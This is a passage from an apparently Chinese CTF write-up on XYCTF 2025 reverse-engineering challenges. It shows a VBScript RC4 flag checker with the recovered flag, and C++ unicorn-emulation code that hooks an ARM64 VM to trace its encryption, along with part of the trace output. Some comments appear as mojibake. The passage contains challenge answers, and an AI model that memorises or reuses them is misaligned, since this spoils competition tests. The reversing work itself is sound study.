        k(i) &#x3D; Asc(Mid(strKey, (i Mod kLen) + 1, 1)) &#39; 瀵嗛挜浣跨敤ASCII缂栫爜
    Next
    
    &#39; KSA瀵嗛挜璋冨害
    j &#x3D; 0
    For i &#x3D; 0 To 255
        j &#x3D; (j + s(i) + k(i)) Mod 256
        temp &#x3D; s(i)
        s(i) &#x3D; s(j)
        s(j) &#x3D; temp
    Next
    
    &#39; PRGA鍔犲瘑娴佺▼
    i &#x3D; 0 : j &#x3D; 0 : outHex &#x3D; &quot;&quot;
    For pos &#x3D; 1 To Len(sMessage)
        i &#x3D; (i + 1) Mod 256
        j &#x3D; (j + s(i)) Mod 256
        temp &#x3D; s(i)
        s(i) &#x3D; s(j)
        s(j) &#x3D; temp
        
        &#39; 鍔犲瘑骞惰浆涓哄崄鍏繘鍒?
        Dim plainChar, cipherByte
        plainChar &#x3D; Asc(Mid(sMessage, pos, 1)) &#39; 鏄庢枃鎸堿SCII澶勭悊
        cipherByte &#x3D; s((s(i) + s(j)) Mod 256) Xor plainChar
        outHex &#x3D; outHex &amp; Right(&quot;0&quot; &amp; Hex(cipherByte), 2)
    Next
    
    RunRC &#x3D; outHex
End Function

&#39; 涓婚獙璇侀€昏緫
If LCase(RunRC(flag, qwfe)) &#x3D; LCase(wefbuwiue) Then
    MsgBox &quot;Congratulations! Correct FLAG!&quot;
Else
    MsgBox &quot;Wrong flag.&quot;
End If


</code></pre>

<p>RC4解密，密钥为<strong>rc4key</strong></p>
<p><img src="/images/1-1744626745337-7.png" loading="lazy"></p>
<p>flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn‘s_chall_is_r3@lly_gr3@t_&amp;_fuN!}</p>
<h3 id="ezVM"><a href="#ezVM" class="headerlink" title="ezVM"></a>ezVM</h3><p>通过字符串界面里的unicorn和加密函数的一些特征发现是使用了unicorn框架调用了一串代码。</p>
<p>找一个使用unicorn框架的程序进行bindiff恢复一些unicorn函数的符号。</p>
<p>发现是调用了一串ARM64的代码字节进行模拟执行，将输入字符串传入加密返回，并附上了一些data和栈空间初始化。</p>
<p><img src="/images/2-1744626745337-6.png" loading="lazy"></p>
<p><img src="/images/4-1744626745337-8.png" loading="lazy"></p>
<p>将以上调用write写入的数据提取，随便找一个ARM64框架的.so复制到对应地址，以便反编译看代码。</p>
<p>最后得到一个函数，很清晰的看出里面是一个VM虚拟机执行的流程。</p>
<p><img src="/images/5-1744626745337-10.png" loading="lazy"></p>
<p>使用c++编写代码调用unicorn库进行模拟。</p>
<p>使用Hook，在关键计算地址处进行Hook，输出各个计算流程以及数据。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"data.hpp"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"unicorn/unicorn.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span></span><span class="token string">"unicorn-import.lib"</span><span class="token expression"><span class="token punctuation">)</span></span></span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hook_code</span><span class="token punctuation">(</span>uc_engine<span class="token operator">*</span> uc<span class="token punctuation">,</span> <span class="token keyword">uint64_t</span> address<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> size<span class="token punctuation">,</span> <span class="token keyword">void</span><span class="token operator">*</span> user_data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">uint64_t</span> w0<span class="token punctuation">,</span>w1<span class="token punctuation">,</span>w2<span class="token punctuation">,</span>w3<span class="token punctuation">,</span>w4<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x1fac</span><span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W3 = W1 ^ W0 --- %llx ^ %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span>w0<span class="token punctuation">,</span>w1<span class="token operator">^</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x2BE4</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W3 = W1 >> W0 --- %llx >> %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w1 <span class="token operator">>></span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x2DB4</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W3 = W1 &lt;&lt; W0 --- %llx &lt;&lt; %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w1 <span class="token operator">&lt;&lt;</span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x232C</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W2 = W0 &amp; W3 --- %llx &amp; %llx = %llx\n"</span><span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w3<span class="token punctuation">,</span> w0 <span class="token operator">&amp;</span> w3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x2054</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n"</span><span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w3<span class="token punctuation">,</span> w3 <span class="token operator">^</span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x2238</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n"</span><span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w3<span class="token punctuation">,</span> w3 <span class="token operator">^</span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x2180</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W4<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w4<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W1 = W1 ^ W4 --- %llx ^ %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span> w4<span class="token punctuation">,</span> w1 <span class="token operator">^</span> w4<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x1CC4</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W2 = W1 + W0 --- %llx + %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w1 <span class="token operator">+</span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>address <span class="token operator">==</span> <span class="token number">0x1A0C</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">uc_reg_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> UC_ARM64_REG_W1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>w1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"W2 = W1 + W0 --- %llx + %llx = %llx\n"</span><span class="token punctuation">,</span> w1<span class="token punctuation">,</span> w0<span class="token punctuation">,</span> w1 <span class="token operator">+</span> w0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint8_t</span> Input<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"11112222111111111111111111111111"</span><span class="token punctuation">;</span>
    uc_engine<span class="token operator">*</span> uc<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    uc_hook hook<span class="token punctuation">;</span>
    <span class="token keyword">uint64_t</span> InputAddr <span class="token operator">=</span> <span class="token number">0x14C28</span><span class="token punctuation">;</span>
    <span class="token keyword">uint64_t</span> Stack <span class="token operator">=</span> <span class="token number">0x7F0000</span><span class="token punctuation">;</span>
    <span class="token keyword">uint8_t</span> MyEncFlag<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">uint64_t</span> Base <span class="token operator">=</span> <span class="token number">0x0000000001000000</span><span class="token punctuation">;</span>
    <span class="token function">uc_open</span><span class="token punctuation">(</span>uc_arch<span class="token double-colon punctuation">::</span>UC_ARCH_ARM64<span class="token punctuation">,</span> uc_mode<span class="token double-colon punctuation">::</span>UC_MODE_ARM<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_map</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> Base<span class="token punctuation">,</span> UC_PROT_ALL<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_map</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> Stack <span class="token operator">-</span> <span class="token number">4096</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> UC_PROT_ALL<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_hook_add</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hook<span class="token punctuation">,</span> UC_HOOK_CODE<span class="token punctuation">,</span> hook_code<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x14C28</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>Input<span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x0C70</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>Code<span class="token punctuation">,</span> <span class="token number">8840u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x14010</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>Data1<span class="token punctuation">,</span> <span class="token number">0x9B8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x30F0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>Data2<span class="token punctuation">,</span> <span class="token number">0x54u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_mem_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x149E8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>Data3<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">uc_reg_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>InputAddr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// X0</span>
    <span class="token function">uc_reg_write</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>Stack<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// SP</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">uc_emu_start</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> <span class="token number">0x0C70</span><span class="token punctuation">,</span> <span class="token number">0x2EF4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">uc_mem_read</span><span class="token punctuation">(</span>uc<span class="token punctuation">,</span> InputAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>MyEncFlag<span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%X "</span><span class="token punctuation">,</span> MyEncFlag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">uc_close</span><span class="token punctuation">(</span>uc<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>最后运行输出得到一个vm加密流程</p>
<p>以下是部分输出内容。</p>
<p>output:</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp">W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0</span> <span class="token operator">=</span> <span class="token number">4</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">8</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">32323232</span> <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">1919191</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">32323232</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> c8c8c8c80
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1919191</span> <span class="token operator">^</span> <span class="token number">8</span>c8c8c80 <span class="token operator">=</span> <span class="token number">8</span>d1d1d11
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">32323232</span> <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> <span class="token number">23100176</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">8</span>d1d1d11 <span class="token operator">+</span> <span class="token number">23100176</span> <span class="token operator">=</span> b02d1e87
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">0</span> <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776f</span>6853 <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">=</span> <span class="token number">776f</span>6853
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776f</span>6853 <span class="token operator">^</span> abab1212 <span class="token operator">=</span> dcc47a41
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> b02d1e87 <span class="token operator">^</span> dcc47a41 <span class="token operator">=</span> <span class="token number">6</span>ce964c6
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">6</span>ce964c6 <span class="token operator">+</span> <span class="token number">31313131</span> <span class="token operator">=</span> <span class="token number">9e1</span>a95f7
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9e1</span>a95f7 <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">9e1</span>a95f
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9e1</span>a95f7 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">4f</span>0d4afb80
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9e1</span>a95f <span class="token operator">^</span> d4afb80 <span class="token operator">=</span> <span class="token number">4</span>ab52df
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9e1</span>a95f7 <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> cb7ce27f
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4</span>ab52df <span class="token operator">+</span> cb7ce27f <span class="token operator">=</span> d028355e
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5f</span>5fe6e7 <span class="token operator">>></span> b <span class="token operator">=</span> bebfc
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> bebfc <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">0</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">776f</span>6853 <span class="token operator">+</span> <span class="token number">5f</span>5fe6e7 <span class="token operator">=</span> d6cf4f3a
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> d6cf4f3a <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> f5ec1a5c
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f5ec1a5c <span class="token operator">^</span> d028355e <span class="token operator">=</span> <span class="token number">25</span>c42f02
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">25</span>c42f02 <span class="token operator">+</span> <span class="token number">32323232</span> <span class="token operator">=</span> <span class="token number">57f</span>66134
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">57f</span>66134 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">2</span>bfb309
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">57f</span>66134 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">15f</span>d984d00
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">2</span>bfb309 <span class="token operator">^</span> fd984d00 <span class="token operator">=</span> ff27fe09
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">57f</span>66134 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> <span class="token number">46</span>d45270
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> ff27fe09 <span class="token operator">+</span> <span class="token number">46</span>d45270 <span class="token operator">=</span> <span class="token number">145f</span>c5079
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5f</span>5fe6e7 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">3</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">74696564</span> <span class="token operator">+</span> <span class="token number">5f</span>5fe6e7 <span class="token operator">=</span> d3c94c4b
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> d3c94c4b <span class="token operator">^</span> abab1212 <span class="token operator">=</span> <span class="token number">78625e59</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">45f</span>c5079 <span class="token operator">^</span> <span class="token number">78625e59</span> <span class="token operator">=</span> <span class="token number">3</span>d9e0e20
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span>d9e0e20 <span class="token operator">+</span> <span class="token number">9e1</span>a95f7 <span class="token operator">=</span> dbb8a417
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> dbb8a417 <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> dbb8a41
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> dbb8a417 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">6</span>ddc520b80
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> dbb8a41 <span class="token operator">^</span> dc520b80 <span class="token operator">=</span> d1e981c1
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> dbb8a417 <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">8</span>eded39f
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> d1e981c1 <span class="token operator">+</span> <span class="token number">8</span>eded39f <span class="token operator">=</span> <span class="token number">160</span>c85560
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> bebfcdce <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">17</span>d7f9
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">17</span>d7f9 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">1</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">656</span>b616d <span class="token operator">+</span> bebfcdce <span class="token operator">=</span> <span class="token number">1242</span>b2f3b
